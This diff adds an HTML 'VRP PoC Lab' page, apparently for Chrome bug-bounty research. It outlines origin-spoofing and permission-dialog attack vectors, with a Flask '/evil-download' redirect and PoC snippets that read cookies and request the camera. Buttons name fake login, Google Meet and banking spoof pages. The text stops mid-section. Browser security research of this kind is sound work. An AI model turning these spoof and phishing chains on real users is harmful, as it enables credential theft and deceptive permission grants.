@@ -1,0 +1,2169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Chrome Origin Spoof — VRP PoC Lab</title>
+<style>
+:root {
+  --bg:#0d1117; --bg2:#161b22; --bg3:#21262d;
+  --border:#30363d; --text:#c9d1d9; --dim:#8b949e;
+  --blue:#58a6ff; --blue2:#79c0ff;
+  --red:#ff7b72; --orange:#ffa657; --yellow:#e3b341;
+  --green:#56d364; --purple:#bc8cff;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: var(--bg); color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace;
+  font-size: 14px; line-height: 1.6;
+}
+h1 { color: var(--blue2); font-size: 18px; font-weight: 700; }
+h2 { color: var(--blue); font-size: 14px; font-weight: 700; margin-bottom: 8px; }
+code { background: var(--bg3); border: 1px solid var(--border); border-radius: 4px;
+       padding: 1px 6px; font-family: monospace; font-size: 12px; color: var(--orange); }
+pre  { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
+       padding: 12px 14px; font-size: 12px; overflow-x: auto; line-height: 1.7; }
+
+/* Layout */
+.layout { display: flex; min-height: 100vh; }
+.sidebar {
+  width: 220px; min-height: 100vh; background: var(--bg2);
+  border-right: 1px solid var(--border); padding: 20px 0;
+  position: fixed; top: 0; left: 0; overflow-y: auto;
+}
+.main { margin-left: 220px; padding: 28px 36px; max-width: 900px; }
+
+/* Sidebar nav */
+.nav-brand { padding: 0 16px 16px; border-bottom: 1px solid var(--border); margin-bottom: 12px; }
+.nav-brand .title { color: var(--blue2); font-weight: 800; font-size: 13px; }
+.nav-brand .sub   { color: var(--dim); font-size: 11px; margin-top: 2px; }
+.nav-item {
+  display: block; padding: 7px 16px; color: var(--dim);
+  text-decoration: none; font-size: 12px; border-left: 2px solid transparent;
+  transition: all .15s;
+}
+.nav-item:hover { color: var(--text); background: var(--bg3); border-left-color: var(--blue); }
+.nav-section { padding: 12px 16px 4px; color: var(--dim); font-size: 10px;
+               text-transform: uppercase; letter-spacing: .8px; }
+.badge {
+  display: inline-block; padding: 1px 6px; border-radius: 4px;
+  font-size: 10px; font-weight: 700; margin-right: 6px;
+}
+.bc { background: #3d0000; color: #ff7b72; }
+.bh { background: #2d1500; color: #ffa657; }
+.bm { background: #0d2000; color: #56d364; }
+
+/* Cards */
+.card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 10px; padding: 20px 24px; margin-bottom: 20px;
+}
+.card-header {
+  display: flex; align-items: center; gap: 10px;
+  margin-bottom: 14px; padding-bottom: 12px;
+  border-bottom: 1px solid var(--border);
+}
+.vec-id {
+  background: var(--bg3); border: 1px solid var(--border);
+  border-radius: 6px; padding: 3px 10px;
+  font-family: monospace; font-size: 12px; font-weight: 700; color: var(--blue);
+}
+.impact { font-size: 11px; color: var(--dim); margin-left: auto; }
+
+/* Buttons */
+.btn-group { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 14px; }
+.btn {
+  padding: 8px 16px; border: 1px solid var(--border);
+  border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: 600;
+  transition: all .15s; background: var(--bg3); color: var(--text);
+}
+.btn:hover  { background: var(--bg2); border-color: var(--blue); color: var(--blue); }
+.btn-red    { background: #3d0000; border-color: var(--red); color: var(--red); }
+.btn-red:hover { background: #5a0000; }
+.btn-green  { background: #0d2d00; border-color: var(--green); color: var(--green); }
+.btn-green:hover { background: #134000; }
+.btn-purple { background: #1e1035; border-color: var(--purple); color: var(--purple); }
+.btn-purple:hover { background: #2a1850; }
+
+/* Result log */
+.log {
+  background: #010409; border: 1px solid var(--border);
+  border-radius: 6px; padding: 10px 12px; margin-top: 12px;
+  font-family: monospace; font-size: 12px; min-height: 36px;
+  max-height: 140px; overflow-y: auto;
+}
+.log-line { padding: 1px 0; }
+.log-ok   { color: var(--green); }
+.log-err  { color: var(--red); }
+.log-info { color: var(--blue); }
+.log-warn { color: var(--yellow); }
+
+/* Timing slider */
+.slider-row { display: flex; align-items: center; gap: 10px; margin-top: 10px; }
+.slider-row label { font-size: 12px; color: var(--dim); width: 100px; }
+input[type=range] { flex: 1; accent-color: var(--blue); }
+.slider-val { font-family: monospace; color: var(--orange); font-size: 12px; width: 50px; }
+
+/* Alert boxes */
+.alert { border-radius: 6px; padding: 10px 14px; margin-top: 10px; font-size: 12px; }
+.alert-info    { background:#0c2a4a; border:1px solid #1f6feb; color:#79c0ff; }
+.alert-warn    { background:#2d2200; border:1px solid #9e6a03; color:#e3b341; }
+.alert-success { background:#0d2d00; border:1px solid #2ea043; color:#56d364; }
+.alert-danger  { background:#3d0000; border:1px solid #b91c1c; color:#ff7b72; }
+
+/* Steps */
+.step-list { list-style: none; padding: 0; }
+.step-list li {
+  display: flex; gap: 10px; margin-bottom: 6px; font-size: 12px; align-items: flex-start;
+}
+.step-num {
+  background: var(--blue); color: #0d1117; border-radius: 50%;
+  width: 18px; height: 18px; display: flex; align-items: center;
+  justify-content: center; font-size: 10px; font-weight: 800; flex-shrink: 0; margin-top: 2px;
+}
+
+/* Popup overlay hint */
+#overlay-hint {
+  display: none; position: fixed; top: 16px; right: 16px;
+  background: var(--bg2); border: 1px solid var(--orange);
+  border-radius: 8px; padding: 12px 16px; z-index: 9999;
+  font-size: 12px; color: var(--orange); max-width: 260px;
+}
+#overlay-hint .close-hint {
+  float: right; cursor: pointer; color: var(--dim); margin-left: 8px;
+}
+
+.divider { border: none; border-top: 1px solid var(--border); margin: 24px 0; }
+.active-tab { border-color: var(--red) !important; color: var(--red) !important; background: #3d0000 !important; }
+.v8-panel h2 { color: var(--blue); font-size:13px; margin-bottom: 8px; }
+.v8-panel { padding-top: 4px; }
+.active-v9 { border-color: var(--orange) !important; color: var(--orange) !important; background: #2d1500 !important; }
+.v9-panel h2 { color: var(--blue); font-size:13px; margin-bottom: 8px; }
+.v9-panel { padding-top: 4px; }
+.page-title { margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
+.page-title p { color: var(--dim); font-size: 13px; margin-top: 6px; }
+</style>
+</head>
+<body>
+
+<div id="overlay-hint">
+  <span class="close-hint" onclick="this.parentElement.style.display='none'">✕</span>
+  <span id="overlay-text">Check the popup URL bar now!</span>
+</div>
+
+<div class="layout">
+
+<!-- ══════════════════════ SIDEBAR ══════════════════════ -->
+<nav class="sidebar">
+  <div class="nav-brand">
+    <div class="title">Chrome Origin Spoof</div>
+    <div class="sub">VRP PoC Lab · Local Testing</div>
+  </div>
+  <div class="nav-section">Vectors</div>
+  <a class="nav-item" href="#v1"><span class="badge bc">V1</span> Nav Timing Race</a>
+  <a class="nav-item" href="#v2"><span class="badge bc">V2</span> Error Page Race</a>
+  <a class="nav-item" href="#v3"><span class="badge bh">V3</span> History pushState</a>
+  <a class="nav-item" href="#v4"><span class="badge bh">V4</span> Download Redirect</a>
+  <a class="nav-item" href="#v5"><span class="badge bh">V5</span> about:blank Opener</a>
+  <a class="nav-item" href="#v6"><span class="badge bh">V6</span> Blob URL Spoof</a>
+  <a class="nav-item" href="#v7"><span class="badge bm">V7</span> javascript: URL</a>
+  <a class="nav-item" href="#v8"><span class="badge bc">V8</span> Permission Dialog Spoof</a>
+  <a class="nav-item" href="#v9"><span class="badge bc">V9</span> iframe Injection Spoof</a>
+  <div class="nav-section">Utils</div>
+  <a class="nav-item" href="#notes">📋 Observer Notes</a>
+  <a class="nav-item" href="#" onclick="clearAllLogs();return false">🗑 Clear Logs</a>
+</nav>
+
+<!-- ══════════════════════ MAIN ══════════════════════ -->
+<main class="main">
+
+<div class="page-title">
+  <h1>Chrome Origin Spoofing — VRP PoC Lab</h1>
+  <p>Test 7 origin spoofing vectors against Chrome. Open DevTools → Console for verbose output.
+  Each vector opens a popup — watch the <strong style="color:var(--orange)">URL bar</strong> in that popup window.</p>
+  <div class="alert alert-warn" style="margin-top:10px">
+    ⚠ Test di <strong>Chrome Canary</strong> dulu. Pastikan popup tidak diblok (allow popups untuk localhost).
+    Run: <code>python3 -m http.server 8080</code> lalu buka <code>http://localhost:8080/chrome-origin-spoof-poc.html</code>
+  </div>
+</div>
+
+<!-- ══ V1: Navigation Timing Race ══ -->
+<div class="card" id="v1">
+  <div class="card-header">
+    <span class="vec-id">V1</span>
+    <h2>Navigation Timing Race — URL Bar Freeze</h2>
+    <span class="impact badge bc">Potential $5K–$15K</span>
+  </div>
+
+  <p style="font-size:13px;color:var(--dim);margin-bottom:12px">
+    Buka popup ke <code>https://google.com</code>, lalu navigate ke <code>about:blank</code>
+    dalam window sempit sebelum navigation commit. Jika Chrome freeze URL bar di <code>google.com</code>
+    sementara content sudah blank/diganti → <strong style="color:var(--red)">origin spoof confirmed</strong>.
+  </p>
+
+  <ul class="step-list">
+    <li><span class="step-num">1</span><span>Klik <strong>Launch Test</strong> → popup ke google.com terbuka</span></li>
+    <li><span class="step-num">2</span><span>Lihat URL bar popup: apakah tetap <code>google.com</code> saat content berubah?</span></li>
+    <li><span class="step-num">3</span><span>Coba variasi delay (0ms → 500ms) untuk temukan timing window</span></li>
+  </ul>
+
+  <div class="slider-row">
+    <label>Delay (ms)</label>
+    <input type="range" min="0" max="2000" value="50" step="10"
+           oninput="document.getElementById('v1-delay-val').textContent=this.value+'ms';v1Delay=parseInt(this.value)">
+    <span class="slider-val" id="v1-delay-val">50ms</span>
+  </div>
+
+  <div class="btn-group">
+    <button class="btn btn-red" onclick="testV1()">🚀 Launch Test</button>
+    <button class="btn" onclick="testV1Variants()">🔄 Auto Sweep (0→500ms)</button>
+    <button class="btn" onclick="testV1Stop()">⏹ Stop</button>
+  </div>
+  <div class="log" id="v1-log"><span class="log-info">→ Ready. Click Launch Test.</span></div>
+</div>
+
+<!-- ══ V2: Error Page Race ══ -->
+<div class="card" id="v2">
+  <div class="card-header">
+    <span class="vec-id">V2</span>
+    <h2>Error Page Navigation Race</h2>
+    <span class="impact badge bc">Potential $5K–$15K</span>
+  </div>
+
+  <p style="font-size:13px;color:var(--dim);margin-bottom:12px">
+    Navigate popup ke URL yang hasilkan <code>ERR_ABORTED</code> atau <code>net::ERR_CONNECTION_REFUSED</code>.
+    Race: apakah URL bar freeze di target URL (misal <code>accounts.google.com</code>) sementara
+    content bisa dimanipulasi dari opener?
+  </p>
+
+  <ul class="step-list">
+    <li><span class="step-num">1</span><span>Popup navigate ke URL yang sengaja error</span></li>
+    <li><span class="step-num">2</span><span>Segera setelah error, coba <code>document.write()</code> dari opener</span></li>
+    <li><span class="step-num">3</span><span>Amati: apakah URL bar tunjuk target URL sementara content dari attacker?</span></li>
+  </ul>
+
+  <div class="btn-group">
+    <button class="btn btn-red" onclick="testV2('abort')">Test ERR_ABORTED</button>
+    <button class="btn btn-red" onclick="testV2('refused')">Test ERR_REFUSED</button>
+    <button class="btn btn-red" onclick="testV2('timeout')">Test Timeout Race</button>
+  </div>
+  <div class="log" id="v2-log"><span class="log-info">→ Ready.</span></div>
+</div>
+
+<!-- ══ V3: History pushState Race ══ -->
+<div class="card" id="v3">
+  <div class="card-header">
+    <span class="vec-id">V3</span>
+    <h2>History pushState Cross-Origin Race</h2>
+    <span class="impact badge bh">Potential $5K–$10K</span>
+  </div>
+
+  <p style="font-size:13px;color:var(--dim);margin-bottom:12px">
+    Setelah navigate cross-origin, race <code>history.pushState</code> sebelum navigation commit.
+    Pada beberapa versi Chrome, ada window dimana pushState dari opener bisa execute
+    sebelum same-origin policy sepenuhnya diterapkan.
+  </p>
+
+  <ul class="step-list">
+    <li><span class="step-num">1</span><span>Popup buka, segera coba modifikasi history state</span></li>
+    <li><span class="step-num">2</span><span>Amati apakah URL bar pada popup menampilkan URL yang tidak seharusnya</span></li>
+    <li><span class="step-num">3</span><span>Cek juga response di <code>window.opener</code> reference</span></li>
+  </ul>
+
+  <div class="slider-row">
+    <label>Race delay (ms)</label>
+    <input type="range" min="0" max="500" value="10" step="5"
+           oninput="document.getElementById('v3-delay-val').textContent=this.value+'ms';v3Delay=parseInt(this.value)">
+    <span class="slider-val" id="v3-delay-val">10ms</span>
+  </div>
+
+  <div class="btn-group">
+    <button class="btn btn-red" onclick="testV3()">🚀 Launch Test</button>
+    <button class="btn" onclick="testV3Sweep()">🔄 Auto Sweep</button>
+  </div>
+  <div class="log" id="v3-log"><span class="log-info">→ Ready.</span></div>
+</div>
+
+<!-- ══ V4: Download Redirect Spoof ══ -->
+<div class="card" id="v4">
+  <div class="card-header">
+    <span class="vec-id">V4</span>
+    <h2>Download Dialog Attribution Spoof</h2>
+    <span class="impact badge bh">Potential $3K–$8K</span>
+  </div>
+
+  <p style="font-size:13px;color:var(--dim);margin-bottom:12px">
+    Server attacker return <code>302 → legitimate-domain.com/file.pdf</code>.
+    Chrome download bar/dialog: apakah tunjuk <strong>attacker.com</strong> atau <strong>legitimate-domain.com</strong>
+    sebagai download source? Bug jika tunjuk final URL sebagai trusted source.
+  </p>
+
+  <div class="alert alert-info">
+    Vector ini butuh server. PoC ini simulate dengan <code>meta refresh</code> + Content-Disposition header.
+    Untuk full test, deploy script PHP/Python yang return 302 redirect ke file.
+  </div>
+
+  <pre><span style="color:#8b949e"># Server-side PoC (simpan sebagai redirect.php)</span>
+<span style="color:#56d364">&lt;?php</span>
+<span style="color:#c9d1d9">header</span>(<span style="color:#ffa657">"Location: https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"</span>);
+<span style="color:#c9d1d9">header</span>(<span style="color:#ffa657">"Content-Disposition: attachment; filename=google-logo.png"</span>);
+<span style="color:#c9d1d9">exit</span>();
+<span style="color:#56d364">?&gt;</span>
+
+<span style="color:#8b949e"># Atau Python:</span>
+<span style="color:#79c0ff">from</span> flask <span style="color:#79c0ff">import</span> Flask, redirect
+app = Flask(__name__)
+
+<span style="color:#ff7b72">@app.route</span>(<span style="color:#ffa657">'/evil-download'</span>)
+<span style="color:#79c0ff">def</span> evil():
+    r = redirect(<span style="color:#ffa657">'https://accounts.google.com/logo.png'</span>)
+    r.headers[<span style="color:#ffa657">'Content-Disposition'</span>] = <span style="color:#ffa657">'attachment; filename=invoice.pdf'</span>
+    <span style="color:#79c0ff">return</span> r</pre>
+
+  <div class="btn-group">
+    <button class="btn btn-red" onclick="testV4Local()">Test Local Redirect</button>
+    <button class="btn btn-purple" onclick="copyV4Script()">📋 Copy Server Script</button>
+  </div>
+  <div class="log" id="v4-log"><span class="log-info">→ Deploy server script untuk full test.</span></div>
+</div>
+
+<!-- ══ V5: about:blank Opener ══ -->
+<div class="card" id="v5">
+  <div class="card-header">
+    <span class="vec-id">V5</span>
+    <h2>about:blank Opener Origin Inheritance</h2>
+    <span class="impact badge bh">Potential $3K–$7K</span>
+  </div>
+
+  <p style="font-size:13px;color:var(--dim);margin-bottom:12px">
+    <code>about:blank</code> inherits origin dari opener/parent. Test apakah:
+    (a) URL bar bisa di-spoof via URL manipulation, (b) permission dialog tunjuk wrong origin,
+    (c) <code>document.domain</code> manipulation bisa cross-origin.
+  </p>
+
+  <div class="btn-group">
+    <button class="btn btn-red" onclick="testV5('basic')">Test: Opener Write</button>
+    <button class="btn btn-red" onclick="testV5('permission')">Test: Permission Origin</button>
+    <button class="btn btn-red" onclick="testV5('urlbar')">Test: URL Bar Content</button>
+  </div>
+  <div class="log" id="v5-log"><span class="log-info">→ Ready.</span></div>
+
+  <div class="alert alert-info" style="margin-top:10px">
+    <strong>Observe:</strong> Buka DevTools di popup dan check <code>window.origin</code>,
+    <code>document.domain</code>, dan apa yang tampil saat popup request permission (camera/location).
+  </div>
+</div>
+
+<!-- ══ V6: Blob URL Spoof ══ -->
+<div class="card" id="v6">
+  <div class="card-header">
+    <span class="vec-id">V6</span>
+    <h2>Blob URL Visual / Phishing Chain</h2>
+    <span class="impact badge bh">Potential $2K–$5K</span>
+  </div>
+
+  <p style="font-size:13px;color:var(--dim);margin-bottom:12px">
+    <code>blob:</code> URL menampilkan <code>blob:http://localhost/uuid</code> di URL bar — bukan origin aslinya.
+    Test ini bukan spoof murni, tapi berguna untuk phishing chain jika URL bar bisa hidden/minimize.
+    Juga test apakah permission dialog saat <code>blob:</code> page request camera tunjuk wrong origin.
+  </p>
+
+  <div class="btn-group">
+    <button class="btn btn-red" onclick="testV6('basic')">Basic Blob Page</button>
+    <button class="btn btn-red" onclick="testV6('login')">Fake Login Form</button>
+    <button class="btn btn-red" onclick="testV6('permission')">Permission Dialog Test</button>
+    <button class="btn btn-purple" onclick="testV6('kiosk')">Fullscreen + Blob</button>
+  </div>
+  <div class="log" id="v6-log"><span class="log-info">→ Ready.</span></div>
+
+  <div class="alert alert-warn" style="margin-top:10px">
+    🎯 <strong>Bug class:</strong> Jika <code>navigator.getUserMedia()</code> dari blob: page tunjuk
+    <code>localhost</code> bukan <code>blob:localhost</code> di permission dialog → reportable.
+  </div>
+</div>
+
+<!-- ══ V7: javascript: URL ══ -->
+<div class="card" id="v7">
+  <div class="card-header">
+    <span class="vec-id">V7</span>
+    <h2>javascript: URL Display Behavior</h2>
+    <span class="impact badge bm">Informational / $1K–$3K</span>
+  </div>
+
+  <p style="font-size:13px;color:var(--dim);margin-bottom:12px">
+    Test bagaimana Chrome handle <code>javascript:</code> URLs di berbagai context.
+    Bug jika: scheme tidak ditampilkan di URL bar, atau origin inherited secara tidak benar.
+  </p>
+
+  <div class="btn-group">
+    <button class="btn" onclick="testV7('popup')">javascript: di Popup</button>
+    <button class="btn" onclick="testV7('iframe')">javascript: di iframe</button>
+    <button class="btn" onclick="testV7('anchor')">Link click</button>
+    <button class="btn" onclick="testV7('location')">location= assign</button>
+  </div>
+  <div class="log" id="v7-log"><span class="log-info">→ Ready.</span></div>
+</div>
+
+<!-- ══ V8: Permission Dialog Spoof ══ -->
+<div class="card" id="v8">
+  <div class="card-header">
+    <span class="vec-id">V8</span>
+    <h2>Permission Dialog Origin Spoof</h2>
+    <span class="impact badge bc">Potential $10K–$25K</span>
+  </div>
+
+  <p style="font-size:13px;color:var(--dim);margin-bottom:12px">
+    Permission dialogs (camera, mic, geolocation, notifications) menampilkan origin sebagai
+    indikator kepercayaan utama. Bug: dialog tunjuk <strong style="color:var(--red)">origin yang salah</strong>
+    → user kasih izin ke attacker, mengira sedang izinkan victim domain.
+    5 sub-vector: popup race, cross-origin iframe, sandboxed iframe, data: URL, pre-navigation inject.
+  </p>
+
+  <div class="alert alert-danger" style="margin-bottom:16px">
+    ⚡ <strong>Highest reward class</strong> — permission spoof = user secara eksplisit grant akses
+    ke sensor (camera/mic/GPS) ke attacker. Chrome VRP prioritaskan ini karena langsung bypass
+    user trust model.
+  </div>
+
+  <!-- Sub-vector tabs -->
+  <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px" id="v8-tabs">
+    <button class="btn v8-tab active-tab" data-sub="popup"    onclick="selectV8Tab(this,'popup')">V8a Popup Race</button>
+    <button class="btn v8-tab"            data-sub="iframe"   onclick="selectV8Tab(this,'iframe')">V8b Cross-Origin iframe</button>
+    <button class="btn v8-tab"            data-sub="sandbox"  onclick="selectV8Tab(this,'sandbox')">V8c Sandboxed iframe</button>
+    <button class="btn v8-tab"            data-sub="data"     onclick="selectV8Tab(this,'data')">V8d data: URL</button>
+    <button class="btn v8-tab"            data-sub="preload"  onclick="selectV8Tab(this,'preload')">V8e Pre-Navigation</button>
+  </div>
+
+  <!-- V8a: Popup Race -->
+  <div id="v8-panel-popup" class="v8-panel">
+    <h2>V8a — Popup Permission Race</h2>
+    <p style="font-size:13px;color:var(--dim);margin:8px 0 12px">
+      Buka popup ke <code>https://google.com</code>. Sebelum navigation commit, inject script yang
+      panggil <code>navigator.mediaDevices.getUserMedia()</code>. Jika berhasil, permission dialog
+      akan tunjuk <code>google.com</code> padahal request datang dari attacker (localhost).
+    </p>
+    <ul class="step-list">
+      <li><span class="step-num">1</span><span>Klik Launch → popup ke google.com terbuka</span></li>
+      <li><span class="step-num">2</span><span>Dalam race window, opener coba inject getUserMedia ke popup</span></li>
+      <li><span class="step-num">3</span><span>Amati: permission dialog muncul dengan origin apa?</span></li>
+      <li><span class="step-num">4</span><span>Jika dialog tunjuk <code style="color:var(--red)">google.com</code> → <strong>CRITICAL BUG</strong></span></li>
+    </ul>
+    <div class="slider-row">
+      <label>Race delay</label>
+      <input type="range" min="0" max="1000" value="30" step="10"
+             oninput="document.getElementById('v8a-dv').textContent=this.value+'ms';v8aDelay=parseInt(this.value)">
+      <span class="slider-val" id="v8a-dv">30ms</span>
+    </div>
+    <div class="btn-group">
+      <button class="btn btn-red" onclick="testV8a('camera')">Camera Permission Race</button>
+      <button class="btn btn-red" onclick="testV8a('mic')">Microphone Race</button>
+      <button class="btn btn-red" onclick="testV8a('geo')">Geolocation Race</button>
+      <button class="btn btn-red" onclick="testV8a('notify')">Notification Race</button>
+      <button class="btn" onclick="testV8aSweep()">Auto Sweep 0→500ms</button>
+    </div>
+  </div>
+
+  <!-- V8b: Cross-Origin iframe -->
+  <div id="v8-panel-iframe" class="v8-panel" style="display:none">
+    <h2>V8b — Cross-Origin iframe Permission Confusion</h2>
+    <p style="font-size:13px;color:var(--dim);margin:8px 0 12px">
+      Embed iframe dari <code>localhost</code> (attacker) di dalam page yang sudah load.
+      iframe request permission → apakah dialog tunjuk <strong>parent origin</strong> atau
+      <strong>iframe origin</strong>? Dengan <code>allow="camera"</code> permissions policy,
+      parent bisa delegate permission ke iframe — user mungkin tidak sadari iframe origin berbeda.
+    </p>
+    <ul class="step-list">
+      <li><span class="step-num">1</span><span>Inject iframe dengan <code>allow="camera;microphone"</code></span></li>
+      <li><span class="step-num">2</span><span>iframe request getUserMedia → perhatikan origin di dialog</span></li>
+      <li><span class="step-num">3</span><span>Test: apakah iframe origin jelas tertampil atau disembunyikan?</span></li>
+    </ul>
+    <div class="btn-group">
+      <button class="btn btn-red" onclick="testV8b('camera')">Inject Camera iframe</button>
+      <button class="btn btn-red" onclick="testV8b('geo')">Inject Geo iframe</button>
+      <button class="btn btn-red" onclick="testV8b('notify')">Inject Notify iframe</button>
+      <button class="btn btn-purple" onclick="testV8b('opaque')">Opaque Origin iframe</button>
+    </div>
+    <div id="v8b-iframe-container" style="margin-top:12px;border:1px solid var(--border);
+      border-radius:6px;overflow:hidden;background:var(--bg3)"></div>
+  </div>
+
+  <!-- V8c: Sandboxed iframe -->
+  <div id="v8-panel-sandbox" class="v8-panel" style="display:none">
+    <h2>V8c — Sandboxed iframe Permission (allow-same-origin bypass)</h2>
+    <p style="font-size:13px;color:var(--dim);margin:8px 0 12px">
+      Sandboxed iframe dengan <code>sandbox="allow-scripts allow-same-origin"</code> +
+      <code>allow="camera"</code>. Bug target: sandboxed iframe request permission dan dialog
+      tunjuk parent origin, padahal sandbox harusnya isolate context. Atau: sandbox tanpa
+      <code>allow-same-origin</code> bisa request permission dengan <em>null origin</em>.
+    </p>
+    <pre><span style="color:#8b949e">&lt;!-- Sandbox iframe: origin = null (opaque) --&gt;</span>
+&lt;iframe <span style="color:#ffa657">sandbox="allow-scripts"</span>
+        <span style="color:#56d364">allow="camera; microphone; geolocation"</span>
+        src="attacker-page.html"&gt;&lt;/iframe&gt;
+<span style="color:#8b949e">
+&lt;!-- Bug: permission dialog tunjuk "null" atau parent origin? --&gt;
+&lt;!-- Chrome seharusnya blok permission request dari null-origin sandbox --&gt;</span></pre>
+    <div class="btn-group">
+      <button class="btn btn-red" onclick="testV8c('null-origin')">Null Origin Sandbox</button>
+      <button class="btn btn-red" onclick="testV8c('same-origin')">allow-same-origin Sandbox</button>
+      <button class="btn btn-red" onclick="testV8c('nested')">Nested Sandbox Escape</button>
+    </div>
+    <div id="v8c-container" style="margin-top:12px"></div>
+  </div>
+
+  <!-- V8d: data: URL -->
+  <div id="v8-panel-data" class="v8-panel" style="display:none">
+    <h2>V8d — data: URL Permission Origin</h2>
+    <p style="font-size:13px;color:var(--dim);margin:8px 0 12px">
+      <code>data:</code> URL punya <strong>null/opaque origin</strong>. Test: jika
+      data: URL page request camera/mic/geo, permission dialog tunjuk apa?
+      Chrome seharusnya tunjuk <code>"data:"</code> atau blok permission.
+      Bug jika tunjuk <code>localhost</code> (parent/opener origin).
+    </p>
+    <pre><span style="color:#8b949e">// data: URL dibuka sebagai popup / iframe</span>
+<span style="color:#79c0ff">const</span> page = btoa(<span style="color:#ffa657">`&lt;script&gt;
+  navigator.mediaDevices.getUserMedia({video:true})
+    .then(s =&gt; document.body.innerHTML = '&lt;b style=color:green&gt;GRANTED&lt;/b&gt;')
+    .catch(e =&gt; document.body.innerHTML = '&lt;b style=color:red&gt;'+e.message+'&lt;/b&gt;')
+&lt;/script&gt;`</span>);
+<span style="color:#79c0ff">const</span> url = <span style="color:#ffa657">`data:text/html;base64,${page}`</span>;
+window.open(url); <span style="color:#8b949e">// What does permission dialog show?</span></pre>
+    <div class="btn-group">
+      <button class="btn btn-red" onclick="testV8d('camera-popup')">data: Camera Popup</button>
+      <button class="btn btn-red" onclick="testV8d('geo-popup')">data: Geo Popup</button>
+      <button class="btn btn-red" onclick="testV8d('notify-popup')">data: Notify Popup</button>
+      <button class="btn btn-red" onclick="testV8d('iframe')">data: in iframe</button>
+    </div>
+  </div>
+
+  <!-- V8e: Pre-Navigation inject -->
+  <div id="v8-panel-preload" class="v8-panel" style="display:none">
+    <h2>V8e — Pre-Navigation Permission Inject</h2>
+    <p style="font-size:13px;color:var(--dim);margin:8px 0 12px">
+      Popup dibuka ke <code>about:blank</code>, lalu opener <em>segera</em> inject page
+      yang mirip legitimate domain (spoofed UI) dan langsung request permission.
+      Race: sebelum user curiga cek URL bar, permission dialog sudah muncul dengan origin
+      <code>localhost</code>. Test apakah timing bisa membuat user tidak sadar origin salah.
+    </p>
+    <ul class="step-list">
+      <li><span class="step-num">1</span><span>Popup about:blank terbuka (user lihat URL bar: <code>about:blank</code>)</span></li>
+      <li><span class="step-num">2</span><span>Opener inject UI Google Meet palsu + langsung panggil getUserMedia</span></li>
+      <li><span class="step-num">3</span><span>Dialog muncul: tunjuk <code>localhost</code> — apakah cukup meyakinkan?</span></li>
+      <li><span class="step-num">4</span><span>Coba chain dengan fullscreen untuk sembunyikan URL bar</span></li>
+    </ul>
+    <div class="btn-group">
+      <button class="btn btn-red" onclick="testV8e('meet')">Google Meet Spoof</button>
+      <button class="btn btn-red" onclick="testV8e('zoom')">Zoom Spoof</button>
+      <button class="btn btn-red" onclick="testV8e('bank')">Banking App Spoof</button>
+      <button class="btn btn-purple" onclick="testV8e('fullscreen')">+ Fullscreen Chain</button>
+    </div>
+  </div>
+
+  <!-- Shared log -->
+  <div class="log" id="v8-log" style="margin-top:14px"><span class="log-info">→ Select a sub-vector tab above, then click a test button.</span></div>
+
+  <div class="alert alert-warn" style="margin-top:12px">
+    🎯 <strong>Kriteria bug valid untuk VRP:</strong> Permission dialog tunjuk origin yang berbeda
+    dari context yang sebenarnya membuat request — atau dialog tidak muncul sama sekali tapi
+    permission granted. Screenshot dialog + URL bar = minimal evidence yang dibutuhkan.
+  </div>
+</div>
+
+<!-- ══ V9: iframe Injection Spoof ══ -->
+<div class="card" id="v9">
+  <div class="card-header">
+    <span class="vec-id">V9</span>
+    <h2>iframe Injection &amp; Content Spoof</h2>
+    <span class="impact badge bc">Potential $8K–$30K</span>
+  </div>
+
+  <p style="font-size:13px;color:var(--dim);margin-bottom:12px">
+    6 sub-vector serangan berbasis iframe: injeksi konten lintas-origin, UI overlay clickjacking,
+    srcdoc origin inheritance, postMessage relay bypass, top-level navigation hijack, dan
+    <code>document.domain</code> relaxation untuk cross-origin DOM read.
+    Setiap vector memiliki impact berbeda — dari info disclosure hingga full page takeover.
+  </p>
+
+  <div class="alert alert-danger" style="margin-bottom:16px">
+    ⚡ <strong>V9e (Top Nav Hijack)</strong> dan <strong>V9d (postMessage Relay)</strong>
+    adalah yang paling reportable — keduanya mempengaruhi halaman <em>luar</em> iframe,
+    bukan hanya konten di dalamnya.
+  </div>
+
+  <!-- Tabs -->
+  <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px">
+    <button class="btn v9-tab active-v9" data-p="srcdoc"    onclick="selV9(this,'srcdoc')">V9a srcdoc Origin</button>
+    <button class="btn v9-tab"           data-p="redirect"  onclick="selV9(this,'redirect')">V9b Open Redirect</button>
+    <button class="btn v9-tab"           data-p="click"     onclick="selV9(this,'click')">V9c Clickjacking</button>
+    <button class="btn v9-tab"           data-p="postmsg"   onclick="selV9(this,'postmsg')">V9d postMessage Relay</button>
+    <button class="btn v9-tab"           data-p="topnav"    onclick="selV9(this,'topnav')">V9e Top-Nav Hijack</button>
+    <button class="btn v9-tab"           data-p="domdomain" onclick="selV9(this,'domdomain')">V9f document.domain</button>
+  </div>
+
+  <!-- V9a: srcdoc Origin -->
+  <div id="v9p-srcdoc" class="v9-panel">
+    <h2>V9a — srcdoc iframe Origin Inheritance</h2>
+    <p style="font-size:13px;color:var(--dim);margin:8px 0 12px">
+      <code>&lt;iframe srcdoc="..."&gt;</code> inherits origin dari parent page — bukan null/opaque.
+      Bug target: apakah srcdoc content bisa melakukan aksi yang harusnya restricted ke parent origin?
+      Contoh: <code>fetch()</code> ke cookie-bearing endpoint, <code>localStorage</code> read,
+      atau <code>document.cookie</code> access dengan parent's origin.
+    </p>
+    <pre><span style="color:#8b949e">&lt;!-- srcdoc: origin = parent's origin (localhost) --&gt;</span>
+&lt;iframe srcdoc=<span style="color:#ffa657">"&lt;script&gt;
+  console.log('origin:', window.origin);
+  console.log('cookie:', document.cookie);
+  fetch('/api/secret').then(r=&gt;r.text()).then(console.log)
+&lt;/script&gt;"</span>&gt;&lt;/iframe&gt;
+
